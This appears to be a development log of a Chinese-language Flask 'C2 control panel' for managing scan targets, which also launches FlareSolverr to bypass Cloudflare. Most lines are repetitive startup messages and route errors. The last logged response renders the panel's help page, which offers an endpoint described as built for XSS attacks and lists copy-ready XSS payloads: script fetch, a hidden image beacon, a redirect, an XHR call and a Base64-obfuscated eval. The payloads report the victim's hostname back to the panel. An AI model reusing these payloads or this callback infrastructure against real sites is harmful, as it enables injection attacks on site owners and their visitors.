2025-06-24 15:29:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 15:29:02] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 15:30:00 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:30:00 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:30:00 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:30:00 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:30:00 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:30:00 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:30:00 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:30:00 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:30:00 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 15:30:11 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:30:11 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:30:11 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:30:11 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:30:11 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:30:11 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:30:11 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:30:11 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:30:11 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 15:30:15 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 15:30:15 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 15:30:15 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:30:15 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:30:15 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:30:15 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 15:30:15 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:30:15 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 15:30:15 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:30:15 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 15:30:15 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:30:15 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 15:30:15 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 15:30:15 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:30:15 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 15:30:15 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 15:30:15 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 16:45:40 | INFO     | config.py:209 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 16:45:40 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-24 16:45:40 | INFO     | index_routes.py:17 | index() | 查詢到 0 個目標
2025-06-24 16:45:40 | INFO     | config.py:214 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.033s)
2025-06-24 16:45:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:45:40] "GET / HTTP/1.1" 200 -
2025-06-24 16:45:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:45:40] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:45:47 | INFO     | config.py:209 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 16:45:47 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-24 16:45:47 | INFO     | index_routes.py:17 | index() | 查詢到 0 個目標
2025-06-24 16:45:47 | INFO     | config.py:214 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.001s)
2025-06-24 16:45:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:45:47] "GET / HTTP/1.1" 200 -
2025-06-24 16:45:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:45:47] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:45:48 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 16:45:48 | INFO     | control_route.py:39 | get_messages() | 用戶請求獲取消息
2025-06-24 16:45:48 | ERROR    | control_route.py:45 | get_messages() | 獲取消息時發生錯誤: Could not build url for endpoint 'control.help_html_page'. Did you mean 'control.get_messages' instead?
2025-06-24 16:45:48 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.006s)
2025-06-24 16:45:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:45:48] "[35m[1mGET /api/control/get_messages HTTP/1.1[0m" 500 -
2025-06-24 16:45:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:45:48] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:46:19 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 16:46:19 | INFO     | control_route.py:39 | get_messages() | 用戶請求獲取消息
2025-06-24 16:46:19 | ERROR    | control_route.py:45 | get_messages() | 獲取消息時發生錯誤: Could not build url for endpoint 'control.help'. Did you mean 'control.add_message' instead?
2025-06-24 16:46:19 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.006s)
2025-06-24 16:46:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:46:19] "[35m[1mGET /api/control/get_messages HTTP/1.1[0m" 500 -
2025-06-24 16:46:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:46:19] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:47:05 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 16:47:05 | INFO     | control_route.py:39 | get_messages() | 用戶請求獲取消息
2025-06-24 16:47:05 | ERROR    | control_route.py:45 | get_messages() | 獲取消息時發生錯誤: Could not build url for endpoint 'control.help_page'. Did you mean 'control.get_messages' instead?
2025-06-24 16:47:05 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.004s)
2025-06-24 16:47:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:05] "[35m[1mGET /api/control/get_messages HTTP/1.1[0m" 500 -
2025-06-24 16:47:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:05] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:47:06 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 16:47:06 | INFO     | control_route.py:39 | get_messages() | 用戶請求獲取消息
2025-06-24 16:47:06 | ERROR    | control_route.py:45 | get_messages() | 獲取消息時發生錯誤: Could not build url for endpoint 'control.help_page'. Did you mean 'control.get_messages' instead?
2025-06-24 16:47:06 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.002s)
2025-06-24 16:47:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:06] "[35m[1mGET /api/control/get_messages HTTP/1.1[0m" 500 -
2025-06-24 16:47:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:06] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:47:06 | INFO     | config.py:209 | wrapper() | 📞 調用函數 get_messages (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 16:47:06 | INFO     | control_route.py:39 | get_messages() | 用戶請求獲取消息
2025-06-24 16:47:06 | ERROR    | control_route.py:45 | get_messages() | 獲取消息時發生錯誤: Could not build url for endpoint 'control.help_page'. Did you mean 'control.get_messages' instead?
2025-06-24 16:47:06 | INFO     | config.py:214 | wrapper() | ✅ 函數 get_messages 執行成功 (耗時: 0.002s)
2025-06-24 16:47:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:06] "[35m[1mGET /api/control/get_messages HTTP/1.1[0m" 500 -
2025-06-24 16:47:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:06] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:47:19 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 16:47:19 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 16:47:19 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 16:47:19 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 16:47:19 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 16:47:19 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 16:47:19 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 16:47:19 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 16:47:19 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 16:47:23 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 16:47:23 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 16:47:23 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 16:47:23 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 16:47:23 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 16:47:23 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 16:47:23 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 16:47:23 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 16:47:23 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 16:47:23 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 16:47:23 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 16:47:23 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 16:47:23 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 16:47:23 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 16:47:23 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 16:47:23 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 16:47:23 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 16:47:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 16:47:23 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 16:47:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0292s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 16:47:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:23] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 16:47:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:23] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-24 16:47:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:23] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:47:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 16:47:25 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 16:47:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 3165 bytes [200 OK]>
2025-06-24 16:47:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:25] "GET /api/control/help HTTP/1.1" 200 -
2025-06-24 16:47:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:47:25] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:53:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 16:53:29 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 16:53:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 3165 bytes [200 OK]>
2025-06-24 16:53:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:53:29] "GET /api/control/help HTTP/1.1" 200 -
2025-06-24 16:53:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:53:29] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:53:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:53:30] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:53:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 16:53:32 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 16:53:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 3165 bytes [200 OK]>
2025-06-24 16:53:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:53:32] "GET /api/control/help HTTP/1.1" 200 -
2025-06-24 16:53:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:53:32] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:53:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 16:53:33] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 16:53:54 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 16:53:54 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 16:53:54 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 16:53:54 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 16:53:54 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 16:53:54 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 16:53:54 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 16:53:54 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 16:53:54 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 16:53:56 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 16:53:56 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 16:53:56 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 16:53:56 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 16:53:56 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 16:53:56 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 16:53:56 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 16:53:56 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 16:53:56 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 16:53:56 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 16:53:56 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 16:53:56 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 16:53:56 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 16:53:56 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 16:53:56 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 16:53:56 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 16:53:56 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 16:53:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 16:53:56 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 16:53:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0076s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>C2 控制面板 API 文檔</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<div class="container">\n    <h2>C2 控制面板 API 文檔</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">版本 1.0 - 完整的API使用說明</p>\n\n    <!-- API 端點列表 -->\n    <div class="help-section">\n        <h1>🚀 API 端點</h1>\n        <div class="endpoints-grid">\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge post">POST</span>\n                    <code class="endpoint-path">/add_message</code>\n                </div>\n                <p class="endpoint-description">通過表單添加控制消息</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">通過網頁表單提交</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">/add_message</code>\n                </div>\n                <p class="endpoint-description">通過URL參數添加控制消息（適用於XSS攻擊）</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">/add_message?message=惡意命令&amp;target_ip=192.168.1.100</code>\n                </div>\n\n                \n                <div class="xss-note">\n                    <span class="xss-badge">XSS</span>\n                    適合嵌入到 XSS 攻擊中\n                </div>\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">/get_messages</code>\n                </div>\n                <p class="endpoint-description">獲取所有控制消息列表</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">/get_messages</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">/help</code>\n                </div>\n                <p class="endpoint-description">顯示此幫助頁面</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">/help</code>\n                </div>\n\n                \n            </div>\n            \n        </div>\n    </div>\n\n    <!-- XSS 載荷範例 -->\n    <div class="help-section">\n        <h1>🔥 XSS 攻擊載荷範例</h1>\n        <div class="xss-examples">\n            \n            <div class="xss-example-card">\n                <h3>基本 XSS 載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;fetch(&#39;/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;fetch(&#39;/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>隱藏的圖片載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;img src=&#39;/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;img src=&#39;/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>JavaScript 重定向</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;window.location.href=&#39;/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;window.location.href=&#39;/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>Ajax 靜默攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>Base64 編碼載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;eval(atob(&#39;ZmV0Y2goJy9hZGRfbWVzc2FnZT9tZXNzYWdlPUJhc2U2NOaUu+aTig==&#39;)).replace(&#39;Base64攻擊&#39;,encodeURIComponent(&#39;Base64攻擊&#39;))&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;eval(atob(&#39;ZmV0Y2goJy9hZGRfbWVzc2FnZT9tZXNzYWdlPUJhc2U2NOaUu+aTig==&#39;)).replace(&#39;Base64攻擊&#39;,encodeURIComponent(&#39;Base64攻擊&#39;))&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 重要提示 -->\n    <div class="help-section">\n        <h1>⚠️ 重要提示</h1>\n        <div class="notes-container">\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>GET 方式添加消息主要用於 XSS 攻擊場景</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>所有消息都會被記錄到數據庫中</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>target_ip 參數是可選的，可以為空</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>消息內容需要進行 URL 編碼以避免特殊字符問題</p>\n            </div>\n            \n            